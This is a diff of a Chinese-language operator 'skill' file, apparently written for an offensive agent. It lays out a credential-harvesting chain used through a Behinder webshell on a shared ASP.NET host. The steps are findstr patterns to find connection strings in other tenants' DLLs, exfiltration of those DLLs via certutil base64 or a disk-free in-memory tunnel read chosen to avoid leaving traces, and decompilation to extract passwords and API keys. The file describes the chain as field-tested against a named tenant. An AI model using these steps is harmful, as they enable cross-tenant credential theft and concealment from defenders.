@@ -23,11 +23,15 @@ metadata:
 
 ## 只读链(2026-08 实战验证: uscrec→SFP 租户库)
 1. 列出 Temp Root 哈希目录(每目录=一个租户 ASP.NET 应用), 搜连接串特征:
-   `findstr /s /m /i "data source= 10.10.30. password= pwd=" Root\<dir>\*.dll` (分块扫, 别全树递归——超时)
-2. **下载邻居 DLL 必须用 certutil 转 base64**: 冰蝎 Cmd 载荷的 execCMD 有 UTF-8 回环转换,
-   `type` 直出二进制会被损坏。正确姿势:
-   `certutil -encode <dll> <自己可写的Content\Uploads>\x.b64 & type x.b64 & del x.b64`
-   (写自己的沙箱目录, 用完删)
+   `findstr /s /m /i /c:"data source=" /c:"Initial Catalog=" /c:"User ID=" /c:"10.10.30." /c:"sql50" Root\<dir>\*.dll` (分块扫, 别全树递归——超时)
+   ★ **findstr 空格 = OR 分隔符 bug**: `"data source= 10.10.30. password="` 会被拆成多个独立模式,
+   "data"/"source=" 等几乎命中所有 DLL → 海量虚报(实战把 1 个真命中虚报成 86 个/42 租户)。
+   每个模式必须单独 `/c:"..."`。真实产量: 42 租户里仅 1 家(SFP.Lib)硬编码了连接串;
+   App_Web 编译页基本干净, 凭据在业务 DLL 的 Settings 类(DefaultSettingValue 属性)里。
+2. **下载邻居 DLL 二选一** (冰蝎 Cmd 载荷 execCMD 有 UTF-8 回环转换, `type` 直出二进制会损坏):
+   a. certutil 转 base64 到自己可写目录: `certutil -encode <dll> <自己Content\Uploads>\x.b64 & type x.b64 & del x.b64` (写自己的沙箱, 用完删)
+   b. ★ 更干净: 隧道载荷加 readfile 动作(见 webshell-http-tunnel skill) → 服务端内存
+      Convert.ToBase64String(File.ReadAllBytes) 直接输出, **零磁盘写入**(用户对留痕敏感时首选)
 3. 本地反编译: ICSharpCode.Decompiler 7.2.1.6856 (netstandard2.0, PS 5.1 可加载,
    依赖 System.Reflection.Metadata/5.0.0 + System.Collections.Immutable/5.0.0 + System.Memory/4.5.5 + System.Runtime.CompilerServices.Unsafe/5.0.0)
 4. grep 反编译源码: `data source=` / `password=` / `DefaultSettingValue` / `ApiKey` / smtp
